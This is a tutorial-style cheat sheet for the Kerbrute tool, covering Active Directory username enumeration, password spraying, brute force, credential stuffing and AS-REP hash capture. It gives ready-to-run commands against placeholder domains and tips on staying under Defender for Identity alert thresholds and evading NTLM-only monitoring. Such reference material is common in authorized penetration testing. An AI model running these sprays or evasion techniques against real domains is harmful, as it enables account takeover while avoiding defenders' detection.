---
title: "Kerbrute"
description: "Kerbrute Kerberos pre-auth user enumeration and password spraying against a domain controller."
category: active-directory
tags: [active-directory, kerberos, enumeration, spraying]
tools: [Kerbrute]
difficulty: beginner
updated: "2026-08-09"
source: "vault:ActiveDirectory/Kerbrute.md"
---

# Kerbrute

> **Warning — Common Mistake: Wrong Subcommand.** The correct subcommand is `kerbrute userenum` — NOT `kerbrute user`. `kerbrute user` does not exist and will return an unknown command error. `userenum` is fully functional.

> **Important — Prerequisites.**
> 1. Network access to the Domain Controller on port **88 (UDP + TCP)**
> 2. Target domain name (FQDN — not NetBIOS)
> 3. Relevant username wordlist or combo file
> 4. Clocks within **5 minutes** of KDC (Kerberos requirement)
> 5. For spraying/bruteforce: know the **domain lockout policy** before running

> **Info — [Kerbrute](https://github.com/ropnop/kerbrute) Overview.** Active Directory account enumeration and credential testing tool that abuses the Kerberos AS-REQ protocol on port 88 — requires no LDAP or SMB access.
> 1. Enumerates valid usernames via KRB5 pre-auth error codes — no lockout risk for enumeration
> 2. Sprays a single password across many accounts
> 3. Brute forces a single account with a password list
> 4. Tests credential combo lists (credential stuffing)
> 5. Passively captures AS-REP hashes for accounts with pre-auth disabled (free AS-REP Roasting)
>
> **Repo:** https://github.com/ropnop/kerbrute — **Protocol:** Kerberos AS-REQ, port **88/UDP+TCP**

> **Info — How Kerbrute userenum Works.** Sends an AS-REQ for each username in the wordlist and inspects the KDC error code in the response.
>
> | KDC Response | Meaning |
> |---|---|
> | `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` (code 6) | User does **not** exist |
> | `PREAUTH_REQUIRED` (code 25) | User **exists** — pre-auth required |
> | Any other non-code-6 error | User **exists** |
> | AS-REP hash returned | User exists **and** pre-auth is disabled — hash is crackable |

---

## Installation

```bash
# Pre-built binary (Linux)
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64 && mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Via Go
go install github.com/ropnop/kerbrute@latest

# Windows
kerbrute_windows_amd64.exe
```

> **Info — Installation Breakdown.**
> 1. **wget** — downloads the pre-built binary directly from the latest GitHub release
> 2. **chmod +x** — makes the binary executable
> 3. **mv → /usr/local/bin/** — places binary in `$PATH` so `kerbrute` works globally without `./`
> 4. **go install** — alternative if the Go toolchain is available; compiles from source
> 5. Windows syntax is identical — just swap the binary name

---

## Global Flags

*Apply to all subcommands.*

| Flag | Default | Description |
|---|---|---|
| `-d`, `--domain` | required | Target domain (e.g. `contoso.local`) |
| `--dc` | auto DNS | KDC IP or hostname; set explicitly to avoid DNS issues |
| `-t`, `--threads` | `10` | Concurrent goroutines |
| `--delay` | `0` | Ms between requests; forces single thread when set |
| `-o`, `--output` | none | Write results to log file |
| `-v`, `--verbose` | off | Print failures in addition to successes |
| `--hash-file` | none | Save captured AS-REP hashes to file |
| `--safe` | off | Abort spray/brute if **any** account is locked out |
| `--downgrade` | off | Force RC4 (`arcfour-hmac-md5`); use against older DCs |

---

## Subcommands

| Subcommand | Input | Use Case |
|---|---|---|
| `userenum` | username wordlist | Enumerate valid usernames — no lockout risk |
| `passwordspray` | user list + single password | Spray one password across all users |
| `bruteuser` | single username + password list | Brute force one account |
| `bruteforce` | `user:pass` combo file | Multi-account credential stuffing |

---

## userenum — Username Enumeration

**Purpose:** Identify valid AD accounts by abusing KRB5 pre-auth error codes — no lockout triggered.

```bash
# Basic enumeration
kerbrute userenum -d contoso.local --dc 10.10.10.100 /usr/share/seclists/Usernames/jsmith.txt

# Save valid users + grab AS-REP hashes, verbose
kerbrute userenum -d contoso.local --dc 10.10.10.100 \
  -o valid_users.txt --hash-file asrep_hashes.txt -v \
  /usr/share/seclists/Usernames/statistically-likely-usernames/jsmith.txt

# Higher thread count for larger wordlists
kerbrute userenum -d corp.local --dc 192.168.1.10 -t 50 \
  -o found.txt users.txt

# Windows
kerbrute_windows_amd64.exe userenum -d corp.local --dc 10.0.0.1 users.txt
```

> **Info — Command Breakdown (userenum).**
> 1. **`-d contoso.local`** — target domain FQDN (not NetBIOS name)
> 2. **`--dc 10.10.10.100`** — explicitly targets the KDC by IP, bypassing DNS resolution
> 3. **`-o valid_users.txt`** — writes confirmed valid usernames to file for later stages
> 4. **`--hash-file asrep_hashes.txt`** — passively captures AS-REP hashes for any pre-auth-disabled account; crack offline with `hashcat -m 18200`
> 5. **`-v`** — shows all attempts including failures; useful for debugging
> 6. **`-t 50`** — increases concurrent goroutines; raise cautiously — high values increase detection risk

> **Success — Output Interpretation.**
> 1. **`VALID USERNAME`** — user exists in the domain
> 2. **AS-REP hash lines in `--hash-file`** — account has pre-auth disabled; crack with `hashcat -m 18200`
> 3. **No output / all unknown** — wrong domain name, DC unreachable, or clock skew

> **Tip — OPSEC (userenum).**
> 1. Does **NOT** increment the bad password counter — no lockout risk
> 2. Does **NOT** generate Event ID 4625 (NTLM) — bypasses many legacy SIEM rules
> 3. **DOES** generate Event ID 4768 (Kerberos TGT request) if Kerberos audit logging is enabled
> 4. High volume of 4768s from a single non-domain-joined IP triggers Microsoft Defender for Identity (MDI) "Account enumeration reconnaissance" alert
> 5. Lower `-t` and add `--delay` to blend traffic volume — source IP context still detectable

---

## passwordspray — Password Spraying

**Purpose:** Test one password against many accounts — minimises per-account failure count to stay under the lockout threshold.

> **Danger — Lockout Risk: Read Before Running.** Each failed attempt **increments the bad password count**. Always determine `Account Lockout Threshold` from `Default Domain Policy` before running. Always pass `--safe` to abort if any account locks out.

```bash
# Basic spray with lockout safety
kerbrute passwordspray -d contoso.local --dc 10.10.10.100 \
  --safe valid_users.txt 'Winter2025!'

# Slow spray (1 req/sec) to avoid MDI thresholds
kerbrute passwordspray -d contoso.local --dc 10.10.10.100 \
  --safe --delay 1000 -t 1 valid_users.txt 'Company123'

# Save hits
kerbrute passwordspray -d corp.local --dc 10.0.0.1 \
  --safe -o spray_hits.txt users.txt 'Password1'
```

> **Info — Command Breakdown (passwordspray).**
> 1. **`--safe`** — aborts the entire spray if any single account locks out; always use in production
> 2. **`--delay 1000`** — 1000 ms (1 second) between requests; forces single-thread sequential spray
> 3. **`-t 1`** — reduces to single thread; combined with `--delay` for maximum stealth
> 4. **`-o spray_hits.txt`** — logs successful credential pairs to file
> 5. Passwords with special characters must be quoted: `'P@$$w0rd'` (double quotes on Windows cmd)

> **Success — Output Interpretation.**
> 1. **`VALID LOGIN`** — credential pair confirmed; account not locked
> 2. **`LOCKED`** — account locked mid-spray; `--safe` aborts at this point
> 3. **No output** — password incorrect for all accounts, or all requests errored

> **Tip — OPSEC (passwordspray).**
> 1. Generates Event ID 4768 (TGT request) and Event ID 4771 (pre-auth failed) per attempt
> 2. MDI triggers "Brute force attack using Kerberos" at ~15 failures in 30 minutes from one source
> 3. Does **not** generate Event ID 4625 — evades NTLM-only monitors
> 4. Use `--delay 3600000` (1 hour between requests) for very slow sprays in hardened environments

---

## bruteuser — Single-Account Brute Force

**Purpose:** Brute force one specific account with a password list.

> **Danger — Lockout Risk: Read Before Running.** Generates Event ID 4768 + 4771 per failure — extremely noisy. The account will lock unless `--safe` + `--delay` are used. Rarely practical against hardened AD — prefer `passwordspray`.

```bash
# Brute a single account
kerbrute bruteuser -d contoso.local --dc 10.10.10.100 \
  --safe jsmith /usr/share/wordlists/rockyou.txt

# With delay to stay under lockout threshold
kerbrute bruteuser -d corp.local --dc 10.0.0.1 \
  --safe --delay 5000 -t 1 administrator wordlist.txt
```

> **Info — Command Breakdown (bruteuser).**
> 1. **`jsmith`** — the single target username (positional argument after flags)
> 2. **`/usr/share/wordlists/rockyou.txt`** — password wordlist; each line tested sequentially
> 3. **`--safe`** — aborts if the account locks out mid-run
> 4. **`--delay 5000`** — 5 seconds between attempts; reduces lockout risk at the cost of time
> 5. **`-t 1`** — single thread; ensures `--delay` applies sequentially

---

## bruteforce — Combo List Credential Stuffing

**Purpose:** Test a list of `username:password` pairs — useful for credential stuffing from breach data.

```bash
# Credential stuffing from breach data
kerbrute bruteforce -d contoso.local --dc 10.10.10.100 \
  --safe -o valid_creds.txt combos.txt

# Pipe from stdin
cat combos.txt | kerbrute bruteforce -d contoso.local --dc 10.10.10.100 --safe -
```

> **Info — Command Breakdown (bruteforce).**
> 1. **`combos.txt`** — combo file with one `username:password` pair per line
> 2. **`--safe`** — aborts on first observed lockout; note this only catches the first locked account
> 3. **`-o valid_creds.txt`** — writes confirmed valid pairs to file
> 4. **Stdin pipe** — pass `-` as the file argument to read from stdin
> 5. Best used with `--delay` in production environments

> **Example — Combo File Format.**
> ```text
> jsmith:Password1
> bwilson:Summer2024!
> administrator:Welcome1
> ```

> **Tip — OPSEC (bruteforce).**
> 1. Same detection surface as `passwordspray` — generates 4768 and 4771 events
> 2. Per-account lockout risk; `--safe` only aborts on the **first** observed lockout
> 3. Always use `--delay` in production environments

---

## Common Errors & Fixes

| Error | Cause | Fix |
|---|---|---|
| `clock skew too great` | Kerberos requires clocks within 5 min of KDC | `sudo ntpdate <DC_IP>` or `sudo timedatectl set-ntp true` |
| `no such host` / DNS error | DNS cannot resolve DC hostname | Explicitly pass `--dc <IP>` |
| `kerbrute: command not found` | Binary not in `$PATH` | Use `./kerbrute` or move to `/usr/local/bin/` |
| `kerbrute user` → unknown command | Wrong subcommand | Correct subcommand is `kerbrute userenum` |
| Zero results on large wordlist | Wrong domain name or DC unreachable | Confirm FQDN (not NetBIOS); test with a known username first |
| Accounts locked mid-run | Lockout threshold too low or spray too fast | Always pass `--safe`; check `Default Domain Policy → Account Lockout Threshold` |
| No successes on known-valid creds | Domain name or DC routing issue | Test with `bruteuser` against your own test account first |

```bash
# Fix clock skew
sudo ntpdate <DC_IP>
# or
sudo timedatectl set-ntp true
```

> **Info — Clock Skew Fix Breakdown.**
> 1. **`ntpdate <DC_IP>`** — forces an immediate one-shot NTP sync against the DC's IP directly
> 2. **`timedatectl set-ntp true`** — enables the system's persistent NTP daemon for ongoing sync
> 3. Kerberos enforces a 5-minute maximum clock difference between client and KDC — non-negotiable

---

## Recommended Wordlists

| List | Source | Best For |
|---|---|---|
| `jsmith.txt` | [insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) | `userenum` |
| `xato-net-10-million-usernames.txt` | [SecLists/Usernames](https://github.com/danielmiessler/SecLists/tree/master/Usernames) | `userenum` (large) |
| `rockyou.txt` | Kali `/usr/share/wordlists/` | `bruteuser` |
| `probable-v2-wpa-top4800.txt` | [SecLists](https://github.com/danielmiessler/SecLists) | `passwordspray` |
| Custom `firstname.lastname` lists | username-anarchy / OSINT | Targeted `userenum` |

---

## References

1. [ropnop/kerbrute — GitHub](https://github.com/ropnop/kerbrute)
2. [Event ID 4768 — Kerberos TGT Request](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)
3. [Event ID 4771 — Kerberos Pre-auth Failed](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771)
4. [HackTricks — AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
5. [MITRE ATT&CK — T1110.003 Password Spraying](https://attack.mitre.org/techniques/T1110/003/)
6. [MITRE ATT&CK — T1087.002 Domain Account Enumeration](https://attack.mitre.org/techniques/T1087/002/)
7. [Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/)
